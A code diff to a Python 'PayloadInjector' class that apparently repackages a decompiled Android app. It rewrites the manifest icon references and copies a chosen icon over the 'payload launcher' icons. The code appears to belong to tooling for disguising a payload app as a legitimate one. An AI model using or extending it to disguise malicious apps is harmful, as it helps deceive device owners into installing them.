@@ -452,10 +452,52 @@ class PayloadInjector:
             # 2. Update payload launcher icon (ic_launcher)
             await self._update_payload_launcher_icon(icon_path)
             
+            # 3. Ensure AndroidManifest points to ic_launcher (not adaptive)
+            await self._fix_manifest_icon_reference()
+            
             return True
             
         except Exception as e:
             logger.error(f"Icon injection error: {str(e)}")
+            return False
+    
+    async def _fix_manifest_icon_reference(self):
+        """Fix icon reference in AndroidManifest.xml"""
+        try:
+            manifest_path = os.path.join(self.decompiled_dir, 'AndroidManifest.xml')
+            
+            if not os.path.exists(manifest_path):
+                return False
+            
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            # Replace adaptive icon with standard ic_launcher
+            if '@mipmap/ic_launcher' not in content and '@drawable/ic_launcher' not in content:
+                # Fix icon reference
+                content = re.sub(
+                    r'android:icon="[^"]*"',
+                    'android:icon="@mipmap/ic_launcher"',
+                    content,
+                    count=1
+                )
+                
+                # Also fix roundIcon if exists
+                content = re.sub(
+                    r'android:roundIcon="[^"]*"',
+                    'android:roundIcon="@mipmap/ic_launcher_round"',
+                    content
+                )
+                
+                with open(manifest_path, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                
+                logger.info("✅ Manifest icon reference fixed")
+            
+            return True
+            
+        except Exception as e:
+            logger.debug(f"Manifest icon fix error: {str(e)}")
             return False
     
     async def _update_payload_launcher_icon(self, icon_path):
@@ -518,8 +560,7 @@ class PayloadInjector:
                 for icon_name in ['ic_launcher.png', 'ic_launcher.webp', 'ic_launcher_round.png', 'ic_launcher_round.webp']:
                     target_icon = os.path.join(dir_path, icon_name)
                     
-                    # If file exists, replace it
-                    # If not exists but directory exists, create it
+                    # Copy icon and rename to target format
                     try:
                         shutil.copy2(icon_path, target_icon)
                         updated_count += 1
